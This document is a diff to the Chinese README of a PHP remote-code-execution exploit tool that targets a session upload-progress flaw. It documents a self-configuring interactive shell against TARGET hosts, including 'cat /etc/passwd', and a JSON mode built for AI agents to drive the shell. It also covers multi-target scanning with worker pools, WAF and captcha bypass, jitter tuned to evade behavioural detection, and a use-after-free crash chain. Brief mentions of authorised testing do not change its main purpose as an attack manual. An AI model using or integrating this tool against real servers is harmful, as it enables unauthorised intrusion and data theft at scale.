@@ -32,15 +32,17 @@ python php2shell_exp.py auto https://TARGET/ --flag-cmd "echo hello word > flag.
 ## 2. 攻击面与影响版本
 
 - 触发点：`php_session_rfc1867_callback`（ext/session/session.c），multipart POST 到 PHP SAPI。
-- **影响版本：所有对外服务 Web 请求的 PHP（含 PHP 7.4/8.0/8.1 EOL 分支，官方提供最小源码 backport）**；
-  修复版本：8.5.12 / 8.4.27 / 8.3.36 / 8.2.35。
-- 载荷兼容性：序列化变形 `O:+N:` 自 **PHP 7.2+** 生效、`S:` 转义自 PHP 5.2.1+ 生效 —— **PHP 7.4 全兼容**。
+- **影响版本：PHP 5.4.0 – 8.5.11**；修复版本（2026-10-21，仅受支持分支）：8.5.12 / 8.4.27 / 8.3.36 / 8.2.35。
+  **5.4~8.1 为 EOL 分支，官方无修复、永久受影响。**
+- 载荷兼容性：`O:+N:`（长度 `+` 号）与 `S:` 十六进制转义（PHP 5.2.1+）经公开 WP/取证验证语义成立 —— **PHP 7.4 全兼容**。
+- **实测覆盖（官方正式版，一键通杀全通过）**：7.4.33 / 8.0.30 / 8.1.33 / 8.2.34 / 8.3.35 /
+  8.4.26 / 8.5.11（+8.2.35 补丁版对照），证据见 [TEST_REPORT.md](TEST_REPORT.md) §7-§8。
 
 ## 3. 子命令
 
 | 子命令 | 用途 | 网络行为 |
 | --- | --- | --- |
-| **`shell`** | **RCE 本体功能**：命令执行（`--cmd` 单次 / 省略则 stdin 逐行循环） | 主动 |
+| **`shell`** | **RCE 本体功能 + 稳定通道**：一键自动建链（端点/gadget/分隔符自发现），`--cmd` 单次 / stdin 逐行循环 / `--json` Agent 模式 | 主动 |
 | `auto` | 全自动流水线：识别→绕过→利用→后续操作→报告 | 主动 |
 | `check` | 仅指纹（PHP 版本 + WAF 堆叠识别 + 补丁判定） | 被动 GET |
 | `exploit` | 手动指定单链精确射击 | 主动 |
@@ -49,20 +51,26 @@ python php2shell_exp.py auto https://TARGET/ --flag-cmd "echo hello word > flag.
 > **定位**：EXP 的核心能力是 **RCE（任意命令执行）**。`--flag-cmd`/flag.txt 仅是授权测试的
 > 验证场景之一，不是 EXP 的功能边界——`shell` 才是主接口。
 
-### shell 用法（RCE 主接口）
+### shell 用法（RCE 主接口 + 稳定通道）
 
 ```bash
-# 单命令执行
-python php2shell_exp.py shell https://TARGET/ --seed-path /SEED_PATH --trigger-path /TRIGGER_PATH \
-  --gadget GADGET --prop PROP --cmd "COMMAND"
-
-# 命令循环（交互/管道）
-python php2shell_exp.py shell https://TARGET/ --seed-path /SEED_PATH --trigger-path /TRIGGER_PATH \
-  --gadget GADGET --prop PROP
+# 一键建立稳定 shell 通道（端点/gadget/prop/命令分隔符全自动发现）
+python php2shell_exp.py shell https://TARGET/
 #   > id
 #   > cat /etc/passwd
 #   > exit
+
+# Agent/AI 集成（首行输出通道信息，此后每命令一行 JSON）
+python php2shell_exp.py shell https://TARGET/ --json
+
+# 单命令 / 精确指定端点
+python php2shell_exp.py shell https://TARGET/ --seed-path /SEED_PATH --trigger-path /TRIGGER_PATH \
+  --gadget GADGET --prop PROP --cmd "COMMAND"
 ```
+
+> 通道自动建立：探测 gadget/prop 并**自动识别命令分隔符**（sh `;` / cmd.exe `&`）；输出以
+> `__P2S_B/E_<tok>__` 标记限界提取——告警/HTML/页面噪声天然剔除，stderr 经分组包装整链归并；
+> 瞬时抖动自动重试；stdin 输入已净化 BOM/零宽字符。建链信息输出在 stderr（stdout 可直接管道给 Agent）。
 
 ## 4. 参数总表
 
@@ -85,8 +93,8 @@ python php2shell_exp.py shell https://TARGET/ --seed-path /SEED_PATH --trigger-p
 | `--warmup` | 关 | 预热采集 WAF 追踪 Cookie（acw_tc 等）复用 |
 | `--solver-cmd` | — | 外部滑块/人机求解器命令（stdout 输出放行 Cookie） |
 | `--jitter` | 2.0 | 射击间拟人抖动基数秒（行为/ML 对抗，触顶自动退避 ×1.5≤30s） |
-| `--variant` | 全部 | `pipe_object`（\|前缀）/ `bare_object`（裸对象）子集 |
-| `--seed-mode` | abort | **abort=中止式投毒（兼容默认 `session.upload_progress.cleanup=On`，seed 持久化）** / full=完整发送 |
+| `--variant` | 全部 | `pipe_object`（\|前缀+强制失败尾，默认）/ `pipe_clean`（公开 PoC 原始格式）子集 |
+| `--seed-mode` | full | **full=完整发送（默认；需 `cleanup=Off`——官方实测唯一可靠持久化路径）** / abort=在途窗口实验模式（官方 8.2.34 实测会话仅在解析完成时写盘，上传中窗口不存在；详见 TEST_REPORT §7） |
 
 ### 4.3 利用与后续操作
 
@@ -101,13 +109,15 @@ python php2shell_exp.py shell https://TARGET/ --seed-path /SEED_PATH --trigger-p
 | `--max-attempts` | 64 | hijack 矩阵射击上限 |
 | `--no-uaf` | 关 | 跳过 uaf 链 |
 
-### 4.4 uaf 链偏移
+### 4.4 uaf 链（CVE-2026-109619 真实触发：plant → 解码 OOM → 悬垂复用 → 崩溃）
 
 | 参数 | 说明 |
 | --- | --- |
-| `--binary` | 本地 debug 二进制，nm/objdump 自动提取 `zend_call_function` |
-| `--zval-dtor-addr` + `--delta` | 已知 `zval_ptr_dtor` 地址按 delta 表推算（bookworm 0xc930/noble 0xcef0/jammy 0xd060） |
-| `--offset` / `--stall` | per-build 桶偏移 / 分片停滞秒 |
+| `--uaf-size-mb` | plant 载荷大小（默认 12，需大于目标 `memory_limit`） |
+| `--stall` | 请求间停滞秒（同 worker 亲和窗口） |
+
+> 公开 ASAN 复现结论：崩溃确定性、预认证；**RCE 条件化**（sink + ASLR 泄漏 + 堆排布，build 相关）。
+> 自动化只判 `crash_signal`，不做 RCE 承诺；已被取证证伪的“伪造 delta CALL_ADDR”机制已移除。
 
 ### 4.5 持续测试与输出
 
@@ -121,7 +131,7 @@ python php2shell_exp.py shell https://TARGET/ --seed-path /SEED_PATH --trigger-p
 
 ### 4.6 退出码（自动化集成）
 
-`0`=RCE 确认 · `2`=疑似漏洞/崩溃/armed · `1`=全部不可达 · `3`=单链未命中 · `4`=无发现/无新任务
+`0`=RCE 确认 · `2`=疑似漏洞/崩溃/armed（`exploit --chain uaf` 崩溃命中同为 `2`）· `1`=全部不可达 · `3`=单链未命中 · `4`=无发现/无新任务
 
 ## 5. 支持的 WAF/防御与自动绕过矩阵
 
@@ -159,13 +169,15 @@ python php2shell_exp.py auto -f targets.txt --workers 16 --jitter 8 --rounds 5 -
 jq 'select(.verdict=="rce_confirmed") | {target, via, flag_stage}' report.jsonl
 ```
 
-### Agent 最小调用（两步）
+### Agent 最小调用（三步：侦察→通杀→稳定通道）
 ```bash
 # 1. 侦察（被动）
 python php2shell_exp.py check https://TARGET/
 # 2. 全自动利用+flag
 python php2shell_exp.py auto https://TARGET/ --try-all --flag-cmd "echo hello word > flag.txt && cat flag.txt" --flag-expect "hello word"
 # 结果解析：读 report.jsonl 最后一行 JSON 的 verdict / via / flag_stage.rce_hit
+# 3. 后续操作：稳定 shell 通道（stdout 每行 JSON，直接管道消费）
+echo "id" | python php2shell_exp.py shell https://TARGET/ --json
 ```
 
 ### 已知精确路径时（最小请求量，2 请求出结果）
@@ -180,17 +192,42 @@ python php2shell_exp.py exploit https://TARGET/ --chain hijack \
 | verdict | 含义 | 后续动作 |
 | --- | --- | --- |
 | `rce_confirmed` | 命令执行确认（flag_stage=true 即 flag 已落地） | 测试完成，按约定停火 |
-| `armed` | lab 监控端点命中（upload_progress 已激活） | 换 gadget/偏移续打 |
-| `crash_signal` | worker 崩溃（502/503/连接断） | 存在内存破坏，可续做 uaf 链 |
+| `armed` | lab 监控端点命中（upload_progress 已激活） | 换 gadget/变体续打 |
+| `crash_signal` | worker 崩溃（502/503/连接断），CVE-2026-109619 触发命中（plant→OOM→悬垂复用） | RCE 条件化，人工续做（sink+泄漏+堆排布） |
 | `challenge_blocked` | 人机验证拦截 | `--cookie` 导入或 `--solver-cmd` |
 | `post_blocked` | POST 方法策略封禁（附 block_codes） | 需加白/源站面/换出口 |
 | `likely_vulnerable_no_rce` | 版本面漏洞但链未命中 | 扩 gadget 字典/指定真实路径 |
 | `skipped_patched` | 指纹为已修复版本 | 跳过 |
 
 JSONL 每行含：fingerprint、defense（6 层防御画像+waf_stack）、discovery、chains（每射策略/状态码）、adaptive、flag_stage——可直接入库。
+一键通杀辅助：`chain_prereq`（present=gadget 问题 / absent=前提缺失）+ `chain_prereq_hint`（修复指引）；
+`adaptive` 含 `prereq_absent_early_stop@N` 表示第 N 射提前止损（前提缺失不再空转矩阵）。
+
+> `decode_warning=true` 但无输出：gadget/属性不对，**或 seed 未持久化**（`cleanup=On`）。
+> 注意（官方 8.2.35 实测）：per-directory handler 混淆链在补丁版上**仍可利用**——告警形态
+> 不能作为补丁判据，可靠判据是 `check` 的版本面；根治需升级 **且**全目录统一 `session.serialize_handler`。
 
 ## 8. 安全与作业规范
 
 - 默认载荷为无害标记 `echo P2S_<token>`；破坏性命令仅经 `--cmd/--flag-cmd` 显式指定。
 - `auto` 命中 `rce_confirmed` 即矩阵停火；flag 阶段是唯一后续操作，无持久化/后门。
 - 建议作业参数：`--bypass-level 3 --try-all --jitter 8 --rounds 5 --sleep 60`（低速窗口化，规避行为预算）。
+- 仓库内 `flag.sample.txt` 仅为产物示例；目标端由 `--flag-cmd` 生成 `flag.txt`。勿在作业目录保留与 `--flag-expect` 同值的本地 flag.txt，避免污染判定基准。
+- 自测：`python -m unittest discover -s tests`（纯标准库，改动后请先跑通）。
+- 机制真实性依据：见 [RESEARCH.md](RESEARCH.md)（联网取证 + 官方补丁逆向 + 差异对照）。
+
+## 9. 文档地图
+
+| 文件 | 内容 |
+| --- | --- |
+| [Readme.md](Readme.md) | 使用说明 + 免责声明 + 参数总表 + 调用模板 + 结果判读（本文档） |
+| [CHANGELOG.md](CHANGELOG.md) | 更新日志（版本历史与变更明细） |
+| [RESEARCH.md](RESEARCH.md) | 联网取证 + 官方补丁逆向 + EXP 真假利用差异对照（机制依据） |
+| [TEST_REPORT.md](TEST_REPORT.md) | 本地确定性测试报告（12 用例矩阵 + 通用武器化结论 + 环境销毁记录） |
+| [BYPASS_TECHNIQUES.md](BYPASS_TECHNIQUES.md) | WAF/防御绕过技术文档（实证标注 ✅/🧪/📚 + 蓝队附录） |
+| [USAGE.md](USAGE.md) | 参数总表（与 argparse 逐项对齐）+ JSONL 契约 |
+| [skills/php2shell-exp/SKILL.md](skills/php2shell-exp/SKILL.md) | Agent/自动化操作技能（标准作业流程 + 判定决策树 + 排障） |
+| [tests/test_core.py](tests/test_core.py) | 轻量自测（29 项，`python -m unittest discover -s tests`） |
+| [php2shell_exp.py](php2shell_exp.py) | 唯一可执行入口（单文件、纯标准库） |
+| [flag.sample.txt](flag.sample.txt) | flag 落地产物示例（目标端实际生成 `flag.txt`） |
+| [LICENSE](LICENSE) | AGPL-3.0 |
